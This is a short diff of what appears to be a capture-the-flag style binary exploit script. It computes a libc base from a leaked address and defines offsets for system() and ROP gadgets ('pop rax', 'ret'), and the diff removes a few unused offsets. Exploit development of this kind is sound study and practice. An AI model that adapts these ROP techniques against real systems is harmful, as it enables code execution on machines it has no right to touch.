@@ -59,14 +59,7 @@ dbg('leak')
 base = leak - 0x21b150
 dbg('base')
 
-#ldbase = base + 0x2b1000
-ldbase = base + 0x22d000
-
-rax = base + 0x0003f349#: pop rax; add al, 0x5b; ret;
 system = base + 0x50d70
-gets = base + 0x80520
-mov_rdi_r8 = base + 0
-
 
 ret = base + 0x00029f3b
 rax = base + 0x0003f349#: pop rax; add al, 0x5b; ret;
